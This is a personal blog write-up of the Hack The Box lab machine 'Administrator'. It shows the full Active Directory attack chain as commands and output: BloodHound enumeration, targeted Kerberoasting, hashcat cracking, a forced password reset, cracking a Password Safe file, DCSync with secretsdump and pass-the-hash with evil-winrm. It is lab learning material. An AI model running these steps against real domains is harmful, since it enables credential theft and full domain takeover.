---
layout: post
title: "Administrator"
date: 2025-04-21
categories: [htb, medium]
provider: htb
machine: administrator
---

Administrator currently holds the top spot for the easiest HTB box I've rooted, despite being rated Medium in difficulty. Maybe CPTS just did a great job of teaching me the basics of Active Directory penetration testing, but I did breeze through this machine, and the community rating seems to agree. Now I know what you're thinking: _I said I wouldn't write about a box if I didn't learn anything_. So what are we doing here?

I thought about it for a while. The main goal of these honest write-ups is that they can be relatable for others who are also fresh in the field of offensive security. And even though the box itself was easy, there is still a story here that I hope can help. At the risk of putting you to sleep, I'll have to give a bit of context on my background.

You see, _I'm a Linux kind of guy._ I'm a software engineer by training, and from the start I have been a command-line, C program, Linux kind of guy. My career ended up blowing me to those places with its winds of irony, but I went "ew" every time I've had to do work on any kind of GUI, avoided web development as much as I could, and all that time ago when I first got hooked on "wargames", they were all about Linux and networking, Linux privilege escalation, overflows... (some of the ones now at [OverTheWire](https://overthewire.org/wargames/) are what I started with, in fact, back then hosted at [dievo.org](https://web.archive.org/web/20051124165147/http://www.dievo.org/index.php?cmd=1&part=2&PHPSESSID=b367364a1fa0c6379594c8553b5a0c0a))

Now here I am, wanting to turn my career fully into offensive security, and having to accept that web applications and Active Directory will be a large chunk of my reality, at least for a while. Getting out of your comfort zone is never easy, and I did look at Active Directory in fear. Words are important to me, and I do think "fear" is ultimately the right word in these situations - we are afraid of getting hurt in some way by stepping out.

The thing is, like [one of my favourite drummers](https://www.youtube.com/watch?v=2DdrwLk3pW8) once said, _"you become **really** old when you stop being willing to feel stupid for a bit"._ And boy did I feel stupid. I remember at some point asking what the difference was between a local user and a domain user. Hey, I'm no AD master now either, as a few upcoming write-ups will show. But at least I got to breeze through a box like this one. That's something. So this write-up is my way of telling you, if you find yourself doubting it, that it's _definitely_ worth it to feel stupid for a bit.

Well, if you're still here, let's get back to the box. The exploitation chain is a series of ACL abuses, so BloodHound did all the work really. This made the Mission: Impossible theme feel a bit out of place, but still, lets go through it with the right soundtrack.

## Limp Bizkit's "Take a Look Around" on
This box features an "assumed breach" scenario, and we start off with valid credentials. So uh... \[hacker voice\] _we're in_. Still, we need to know what to connect to, and we start the way we always start:
```
$ sudo nmap -sV 10.10.11.42 -vv -oA initial-tcp
<SNIP>
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-09 16:12:28Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Just a regular, everyday, normal Domain Controller. Except that FTP port, which is the first thing I tried the credentials on. Alas:
```
$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:kali): Olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
```

I tried to login anonymously as well (and failed), so I decided to just take my trusty BloodHound around for a sniff:
```
$ sudo bloodhound-python -u 'Olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb -c all --zip
INFO: Found AD domain: administrator.htb
<SNIP>
INFO: Compressing output into 20250409111956_bloodhound.zip
```

After loading the data on the BloodHound UI, and checking Olivia's outbound object control, we see that she has `GenericAll` rights over another user, Michael. Checking transitive object control, we see that Michael has rights to `ForceChangePassword` on Benjamin, who in turn is a member of the `Share Moderators` group. Maybe _he_ will be able to connect to FTP, so this seems to be our path forward. Good dog.

Before we move on, we look to get a bit more awareness on each of these users. Olivia and Michael are members of the `Remote Management Users` group, so we should be able to connect with WinRM and gather more info if needed. Finally, checking for the shortest paths to Domain Admin, we see that Ethan (_Hunt!_) has `DCSync` rights over the domain. Our mission, should we choose to accept it, is probably to get our hands on his account.

How do we do this? Honestly, even if you knew very little about AD, you could just ask the dog. Right-clicking edges on BloodHound gives you more information, including how to carry out the relevant attacks if applicable. With `GenericAll` we have several options, but since I play these machines in shared instances I went for a targeted Kerberoast, adding a temporary SPN and requesting a TGS ticket, and hoping for the password to be crackable. This is all very easy to do with, well, [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast). We just have to deal with any clock skew between our machine and the target, using `faketime` for example, and we're good to go:
```
$ faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" ~/Repos/targetedKerberoast/targetedKerberoast.py -v -d 'administrator.htb' -u 'Olivia' -p 'ichliebedich' --request-user 'michael'
[*] Starting kerberoast attacks
[*] Attacking user (michael)
[VERBOSE] SPN added successfully for (michael)
[+] Printing hash for (michael)
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$5<SNIP>7$7<REDACTED>f
[VERBOSE] SPN removed successfully for (michael)
```

Unleashing `hashcat` on it revealed the password:
```
$ hashcat michael.hash rockyou.txt
<SNIP>
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$5<SNIP>7$7<REDACTED>f:<REDACTED>
```

Note: as I wrote this, I wondered if another player had made the password crackable. I tried this again, and sure enough, I cracked a _different_ password. I requested a reset for the machine, and right after the reset, `hashcat` was not able to crack the newly requested ticket's hash. So the intended path _is_ to change the password after all, and the next player just has to do the same. So much for trying to be nice.

After connecting to WinRM and FTP for good measure (and finding nothing), it's time to force a change of password on Benjamin. Once again BloodHound tells us how to do this. My first attempt failed due to the password policy in place, which was easy to check with `netexec`. The only requirement was on length:
```
$ net rpc password "Benjamin" "tman" -U "ADMINISTRATOR.HTB"/"Michael"%"password" -S "dc.administrator.htb"
Failed to set password for 'Benjamin' with error: Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirements of the domain..

$ netexec smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' --pass-pol                                           
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [+] Dumping password info for domain: ADMINISTRATOR
SMB         10.10.11.42     445    DC               Minimum password length: 7
<SNIP>

$ net rpc password "Benjamin" "tmantman" -U "ADMINISTRATOR.HTB"/"Michael"%"password" -S "dc.administrator.htb"
```

As predicted, Benjamin can connect to FTP and download a password database:
```
$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:kali): Benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||63155|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||63156|)
125 Data connection already open; Transfer starting.
100% |**************************************|   952       43.15 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (42.82 KiB/s)
ftp> binary
200 Type set to I.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||63157|)
125 Data connection already open; Transfer starting.
100% |**************************************|   952       41.59 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (41.09 KiB/s)
```

I had seen this `.psafe3` format before, and all we need to do is feed the file directly to `hashcat` to attack the master password for the database. Some other formats require a prior step of extracting the hash from the file, but that's not the case here. `hashcat` ate it for breakfast:
```
$ hashcat Backup.psafe3 rockyou.txt -m 5200

<SNIP>
Backup.psafe3:<REDACTED>
```

Opening this database with Password Safe shows us the credentials for Alexander, Emma and Emily. Checking BloodHound, Emily has `GenericWrite` rights over Ethan, so we focus on her. She also happens to be a member of `Remote Management Users`, so we quickly check her desktop to find our user flag:
```
$ evil-winrm -i 10.10.11.42 -u Emily -p '<REDACTED>'

<SNIP>
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls

    Directory: C:\Users\emily\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---          4/9/2025   4:01 AM             34 user.txt
```

## Mission: Impossible to Fail
With `GenericWrite` we can again perform a targeted Kerberoast and hope that the password is weak. So we do just that:
```
$ faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" ~/Repos/targetedKerberoast/targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p '<REDACTED>' --request-user 'ethan'
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3<SNIP>c$a<REDACTED>b
[VERBOSE] SPN removed successfully for (ethan)
```

`hashcat` was having a great day:
```
$ hashcat ethan.hash rockyou.txt
<SNIP>
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3<SNIP>c$a<REDACTED>b:<REDACTED>
```

I had seen at the start that Ethan had `DCSync` rights, but I wondered if that was the work of another player and if I was about to cheese the box. I asked for a reset before running the following, and it still ran, so... it's up there with the easiest root flags ever. We use the Impacket toolkit to dump the Administrator's NTLM hash, and pass that hash to log in with `evil-winrm`:
```
$ impacket-secretsdump 'administrator.htb'/'Ethan':'<REDACTED>'@'DC.ADMINISTRATOR.HTB' -just-dc-user 'Administrator'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<REDACTED>:<REDACTED>:::
<SNIP>

$ evil-winrm -i 10.10.11.42 -u Administrator -H '<REDACTED>'

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          4/9/2025   9:51 AM             34 root.txt
```

## Roll the credits
- It's definitely worth it to feel stupid for a bit. Push through. These wins will feel _earned_.
- As always, for reading this far, you're a champ.